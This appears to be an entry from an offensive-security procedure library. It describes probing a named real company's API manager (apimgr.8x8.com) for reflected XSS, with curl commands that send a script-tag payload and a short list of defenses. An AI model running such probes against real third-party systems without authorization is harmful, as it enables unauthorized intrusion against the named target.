---
id: proc-uuid-identify-418248
name: Identify Vulnerable API Endpoint
tags:
  - recon
  - web
  - api
  - xss
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/curl-send-xss-payload]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Active Scanning]]'
updated_at: '2025-12-14T03:16:30.423Z'
skill_level: intermediate
impact_level: low
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Active Scanning]]'
---
# Identify Vulnerable API Endpoint

## Summary

This procedure involves probing a web application, specifically legacy API endpoints on platforms like WSO2 Data Analytics Server, to identify post-based XSS vulnerabilities through input reflection testing.

## Description

In the context of the 8x8 API manager at https://apimgr.8x8.com, the outdated WSO2 server fails to sanitize POST data, allowing reflected XSS. The procedure tests endpoints for echo of user-supplied input without escaping, setting the stage for payload injection. Expected outcomes include confirmation of vulnerability, enabling further exploitation for JavaScript execution in browsers.

## Requirements

1. Network access to the target HTTPS endpoint
2. Tool like curl for sending test requests
3. Knowledge of common API paths (e.g., /api/legacy)

## Defense

Defensive measures and detection strategies:

- Implement input validation and output encoding (e.g., HTML entity escaping)
- Use Content Security Policy (CSP) to block inline scripts
- Monitor for anomalous POST requests with script tags in logs

## Objectives

1. Discover endpoints accepting POST data without sanitization
2. Verify reflection of input in responses
3. Assess potential for XSS exploitation

## Instructions

### Step 1: Probe for API Endpoints

**Context**: Send benign POST requests to suspected legacy endpoints to check for input reflection.

**Command** ([[commands/curl-send-xss-payload]]):
```bash
curl -X POST https://apimgr.8x8.com/legacy-endpoint -d 'test=reflected' -H 'Content-Type: application/x-www-form-urlencoded' -v
```

> This command sends a test parameter and inspects the response for 'reflected' echo. Success shows unsanitized output in the HTML/JSON response body.

### Step 2: Test for XSS Reflection

**Context**: Escalate to a basic XSS payload to confirm execution potential.

**Command** ([[commands/curl-send-xss-payload]]):
```bash
curl -X POST https://apimgr.8x8.com/legacy-endpoint -d 'param=<script>alert(1)</script>' -H 'Content-Type: application/x-www-form-urlencoded'
```

> Observe if the payload appears unescaped in the response. In a browser, rendering this would trigger the alert, confirming the vulnerability.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Active Scanning]]

### Sub-Techniques


## Commands Used

- [[commands/curl-send-xss-payload]]

## Tools Used


## Tags

- [[recon]]
- [[web]]
- [[api]]
- [[xss]]
